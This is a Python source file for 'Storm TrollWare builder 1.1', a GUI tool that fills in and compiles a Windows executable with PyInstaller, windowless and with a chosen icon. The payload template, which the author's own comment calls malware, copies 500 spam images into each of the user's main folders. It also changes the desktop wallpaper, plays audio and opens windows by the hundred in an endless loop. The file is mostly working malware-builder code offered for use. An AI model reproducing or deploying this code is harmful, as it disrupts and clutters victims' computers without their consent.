#Python 3.14.0
#customtkinter             5.2.2
#pillow                    12.0.0
#pygame-ce                 2.5.6
#pyinstaller               6.16.0
#tk                        0.1.0
#wheel                     0.45.1 ??
from tkinter import *
from customtkinter import CTk,CTkImage,CTkLabel,CTkEntry,CTkButton
from PIL import Image
from tkinter import filedialog
import os
import sys
import subprocess
#this is the python version

def get_resource_path(relative_path): #get the file path
    import os
    import sys
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def remove_():
    if os.path.exists("output.py"):
        os.remove("output.py")
    for file in os.listdir():
        if file.endswith(".spec"):
            os.remove(file)

def main():  #the whole code

    class search:
        def go_back_(): #< to main menu for python version, exit for exe version
                subprocess.Popen([sys.executable,"main.py"] + sys.argv[1:])
                exit()
            
        def search_icon(): #search for icon
                global icon_file_path
                file = filedialog.askopenfile(mode='r',filetypes=[('ICO Files', '*.ico')])
                icon_file_path = os.path.abspath(file.name)
                if file:
                    filepath = os.path.basename(file.name)
                    icon_path.insert(0,filepath)            
        def search_background(): #search for background
                global background_file_path
                file = filedialog.askopenfile(mode='r',filetypes=[('PNG Files', '*.png')])
                background_file_path = os.path.abspath(file.name)
                if file:
                    filepath = os.path.basename(file.name)
                    background.insert(0,filepath)
        def search_spam(): #search for spam image
                global spam_image_path
                file = filedialog.askopenfile(mode='r',filetypes=[('PNG Files', '*.png')])
                spam_image_path = os.path.abspath(file.name)
                if file:
                    filepath = os.path.basename(file.name)
                    spam_image.insert(0,filepath)
        def search_window_image(): #search for window image
                global window_image_path
                file = filedialog.askopenfile(mode='r',filetypes=[('PNG Files', '*.png')])
                window_image_path = os.path.abspath(file.name)
                if file:
                    filepath = os.path.basename(file.name)
                    window_image.insert(0,filepath)
        def search_audio_file(): #search of the audio file
                global audio_file_path
                file = filedialog.askopenfile(mode='r',filetypes=[('MP3 Files', '*.mp3')])
                audio_file_path = os.path.abspath(file.name)
                if file:
                    filepath = os.path.basename(file.name)
                    audio_file.insert(0,filepath)
        
        def start(): #create 

            def notify(color,message,width_hight,name):
                root=CTk()
                root.title(name)
                root.geometry(f"{width_hight}+900+100")
                root.configure(fg_color="black")
                root.resizable(0,0)
                root.iconbitmap(get_resource_path("images//icon.ico"))
                label=CTkLabel(root,text=message,text_color=color,font=("Comic Sans MS",25))
                label.place(x=50,y=30)
                root.mainloop()

            def build(icon1,background_1,spam_1,window_image_1,audio_file_1): 
                code=f"""
import threading
import os
import shutil
import ctypes
import pygame
import sys
from customtkinter import *
from PIL import Image
global times

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

def create_files():
    global times
    times = 500
    dirr = ["Desktop", "Downloads", "Documents", "Pictures", "Videos", "Music"]
    user_path = os.path.expanduser("~")
    
    def desk():
        for i, dr in enumerate(dirr, start=1):
            target_dir = os.path.join(user_path, dr)
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            for j in range(times): 
                try:
                    image="{spam_1}"
                    destination_file = os.path.join(target_dir, f"{{j+1}}{{image}}")
                    shutil.copy(get_resource_path(f"{{image}}"), destination_file)
                except Exception as e:
                    pass
    desk1 = threading.Thread(target=desk)
    desk1.start()

def change_wallpaper():
    image_filename = "{background_1}"
    try:
        full_image_path = get_resource_path(image_filename)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, full_image_path, 3)
    except Exception as e:
        pass

def playsound_():
    AUDIO="{audio_file_1}"
    pygame.mixer.init()  
    audio_file = get_resource_path(AUDIO)
    pygame.mixer.music.load(audio_file)  
    pygame.mixer.music.play()  
    while pygame.mixer.music.get_busy():  
        pygame.time.Clock().tick(10)

def windows_():
        times=150
        window_image="{window_image_1}"
        image_filename = window_image
        while True:
            try:
                main_window= CTk()
                main_window.state('withdraw')
                main_window.title("close me!")
                main_window.geometry("3x3+400+500")
                imag_path=get_resource_path(image_filename)
                ig=Image.open(imag_path)
                ctk_img=CTkImage(light_image=ig,size=(469,455))
                for i in range(times):

                    window=CTkToplevel(main_window)
                    window.geometry("469x455")
                    label =CTkLabel(window,text=' ',image=ctk_img)
                    label.pack(pady=20)
                main_window.mainloop()
            except Exception:
                pass
file_ = threading.Thread(target=create_files)
file_.start()

wallpaper_ = threading.Thread(target=change_wallpaper)
wallpaper_.start()

windows_1=threading.Thread(target=windows_)
windows_1.start()

sound__ = threading.Thread(target=playsound_)
sound__.start()

"""
                #create a malware and change the vars to the new one, execute it as exe with pyinstaller
                with open('output.py','w') as e:
                    e.write(code) #wrtie or overwtie the malware file

                subprocess.run([ #execute it 
                    'pyinstaller',
                    '--onefile',
                    '--icon', icon_file_path,
                    '--add-data', f'{background_file_path};.',
                    '--add-data', f'{spam_image_path};.',
                    '--add-data', f'{audio_file_path};.',
                    '--add-data', f'{window_image_path};.',
                    '--noconsole',
                    '--hidden-import', 'threading', #yea ik sm of em are already built it but still ill add em up
                    '--hidden-import', 'os',
                    '--hidden-import', 'shutil',
                    '--hidden-import', 'ctypes',
                    '--hidden-import', 'pygame-ce',
                    '--hidden-import', 'sys',
                    '--hidden-import', 'customtkinter',
                    '--hidden-import', 'PIL',
                    '--hidden-import', 'PIL.Image',

                    'output.py'
                ])
                builder_()
                remove_()
                notify("lime","done ✅","200x100","notify")

            global icon, background_, spam_, window_image_, audio_file_    
            icon = icon_path.get()
            background_= background.get()
            spam_=spam_image.get()
            window_image_=window_image.get()
            audio_file_=audio_file.get()
            
            if icon=="" or background_=="" or spam_=="" or window_image_=="" or audio_file_=="":
                notify("red","all fields required ❎","350x100","error")

            else:
                build(icon,background_,spam_,window_image_,audio_file_)

    config_bg="black"

    def tamplate_build(): #builder for templates
        os.system("start https://github.com/SStorm21/examples")

    def startup(title,w_width,w_hight,top,left,resizeable): #main
        global window, icon_path, background, spam_image, builder, tamplate_, info
        logo = get_resource_path("images//logo.png")
        image_ = CTkImage(light_image=Image.open(logo), size=(1122, 220))
        window=CTk()
        window.iconbitmap(get_resource_path("images//icon.ico"))
        window.title(title)
        window.resizable(resizeable,resizeable)
        window.geometry(f"{w_hight}x{w_width}+{left}+{top}")
        window.config(bg=config_bg)
        info=CTkLabel(master=window,text="Discord: p3hv    github: SStorm21",font=("Comic Sans MS",25),height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        info.place(x=10,y=690)
        #logo
        logo_= CTkLabel(master=window,image=image_,bg_color=config_bg,text=' ')
        logo_.pack(side='top')
        tamplate_=CTkButton(master=window,hover_color="gray",command=template,text="tamplate 📑",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=100,width=200,bg_color=config_bg,fg_color=config_bg,text_color="white")
        tamplate_.place(x=600,y=350)
        builder=CTkButton(master=window,hover_color="gray",command=builder_,text="builder 🪛",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=100,width=200,bg_color=config_bg,fg_color=config_bg,text_color="white")
        builder.place(x=300,y=350)
        window.mainloop()

    def builder_(): #builder 
        global icon_path, background, spam_image, window_image, audio_file
        builder.place(x=10000)
        tamplate_.place(x=10000)
        icon_path= CTkEntry(master=window,font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=700,bg_color=config_bg,fg_color=config_bg,placeholder_text="icon",text_color="white")
        icon_path.place(x=120,y=260)
        icon_button= CTkButton(master=window,hover_color="gray",command=search.search_icon,text="    🔍🖼️",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        icon_button.place(x=830,y=260)
        background= CTkEntry(master=window,font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=700,bg_color=config_bg,fg_color=config_bg,placeholder_text="background",text_color="white")
        background.place(x=120,y=340)
        background_button= CTkButton(master=window,hover_color="gray",command=search.search_background,text="    🔍🎨\t  ",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        background_button.place(x=830,y=340)
        spam_image= CTkEntry(master=window,font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=700,bg_color=config_bg,fg_color=config_bg,placeholder_text="spam image",text_color="white")
        spam_image.place(x=120,y=422)
        spam_image_button= CTkButton(master=window,hover_color="gray",command=search.search_spam,text="    🔍🪼\t  ",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        spam_image_button.place(x=830,y=422)
        window_image= CTkEntry(master=window,font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=700,bg_color=config_bg,fg_color=config_bg,placeholder_text="window image",text_color="white")
        window_image.place(x=120,y=505)
        window_image_button= CTkButton(master=window,hover_color="gray",command=search.search_window_image,text="    🔍🪟\t  ",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        window_image_button.place(x=830,y=505)
        audio_file= CTkEntry(master=window,font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=700,bg_color=config_bg,fg_color=config_bg,placeholder_text="audio file",text_color="white")
        audio_file.place(x=120,y=590)
        audio_file_button= CTkButton(master=window,hover_color="gray",command=search.search_audio_file,text="    🔍🔉\t  ",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=30,bg_color=config_bg,fg_color=config_bg,text_color="white")
        audio_file_button.place(x=830,y=590)

        execute_button=CTkButton(master=window,hover_color="gray",command=search.start,text="execute ⚙️",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=50,width=20,bg_color=config_bg,fg_color=config_bg,text_color="white")
        execute_button.place(x=940,y=670)
        go_back=CTkButton(master=window,hover_color="gray",command=search.go_back_,text="🔙",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=50,width=60,bg_color=config_bg,fg_color=config_bg,text_color="white")
        go_back.place(x=860,y=670)

    def template(): #templates #yea ill just gonna fix this in the next update or smth? like 1.2?
        def what_is_love_def():
            logo = get_resource_path("images//image2.png")
            image_ = CTkImage(light_image=Image.open(logo), size=(1122, 352))
            what_is_love_icon2= CTkLabel(master=window,image=image_,bg_color=config_bg,text=' ')
            execute_button=CTkButton(master=window,hover_color="gray",command=tamplate_build,text="open 🥏",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=60,bg_color=config_bg,fg_color=config_bg,text_color="white")
            execute_button.place(x=910,y=650)
            what_is_love_icon2.place(x=1,y=250)
            what_is_love.place(x=10000)
            what_is_love_icon.place(x=10000)
            go_back.place(x=820,y=650)

        def abo_al3bd():
            logo = get_resource_path("images//image3.png")
            image_ = CTkImage(light_image=Image.open(logo), size=(1122, 352))
            what_is_love_icon2= CTkLabel(master=window,image=image_,bg_color=config_bg,text=' ')
            execute_button=CTkButton(master=window,hover_color="gray",command=tamplate_build,text="open 🥏",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=60,bg_color=config_bg,fg_color=config_bg,text_color="white")
            execute_button.place(x=910,y=650)
            what_is_love_icon2.place(x=1,y=250)
            what_is_love.place(x=10000)
            what_is_love_icon.place(x=10000)
            go_back.place(x=820,y=650)


        def long_tunge():
            logo = get_resource_path("images//image4.png")
            image_ = CTkImage(light_image=Image.open(logo), size=(1122, 352))
            what_is_love_icon2= CTkLabel(master=window,image=image_,bg_color=config_bg,text=' ')
            execute_button=CTkButton(master=window,hover_color="gray",command=tamplate_build,text="open 🥏",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=60,bg_color=config_bg,fg_color=config_bg,text_color="white")
            execute_button.place(x=910,y=650)
            what_is_love_icon2.place(x=1,y=250)
            what_is_love.place(x=10000)
            what_is_love_icon.place(x=10000)
            go_back.place(x=820,y=650)


        builder.place(x=10000)
        tamplate_.place(x=10000)
        logo = get_resource_path("images//image.png")
        image_ = CTkImage(light_image=Image.open(logo), size=(124, 129))
        logo2 = get_resource_path("images//image22.png")
        image_2 = CTkImage(light_image=Image.open(logo2), size=(124, 129))
        logo3 = get_resource_path("images//imge4.jpg")
        image_3 = CTkImage(light_image=Image.open(logo3), size=(124, 129))

        what_is_love_icon= CTkLabel(master=window,image=image_,bg_color=config_bg,text=' ')
        what_is_love_icon.place(x=145,y=250)
        what_is_love=CTkButton(master=window,hover_color="gray",command=what_is_love_def,text="what is love.exe",font=("Comic Sans MS",20),border_color="white",border_width=1,corner_radius=12,height=30,width=70,bg_color=config_bg,fg_color=config_bg,text_color="white")
        what_is_love.place(x=120,y=400)

        abo_al_3bd_icon= CTkLabel(master=window,image=image_2,bg_color=config_bg,text=' ')
        abo_al_3bd_icon.place(x=390,y=250)
        aboal3bd_b=CTkButton(master=window,hover_color="gray",command=abo_al3bd,text="abo al 3bd.exe",font=("Comic Sans MS",20),border_color="white",border_width=1,corner_radius=12,height=30,width=70,bg_color=config_bg,fg_color=config_bg,text_color="white")
        aboal3bd_b.place(x=370,y=400)

        long_tunge_ico= CTkLabel(master=window,image=image_3,bg_color=config_bg,text=' ')
        long_tunge_ico.place(x=650,y=250)
        long_tunge_button=CTkButton(master=window,hover_color="gray",command=long_tunge,text="Long Tunge.exe",font=("Comic Sans MS",20),border_color="white",border_width=1,corner_radius=12,height=30,width=70,bg_color=config_bg,fg_color=config_bg,text_color="white")
        long_tunge_button.place(x=630,y=400)

        go_back=CTkButton(master=window,hover_color="gray",command=search.go_back_,text="🔙",font=("Comic Sans MS",25),border_color="white",border_width=1,corner_radius=12,height=70,width=60,bg_color=config_bg,fg_color=config_bg,text_color="white")
        go_back.place(x=940,y=650)
    
    startup("Storm TrollWare builder 1.1",750,1122,100,400,False)

if __name__=="__main__":
    main()










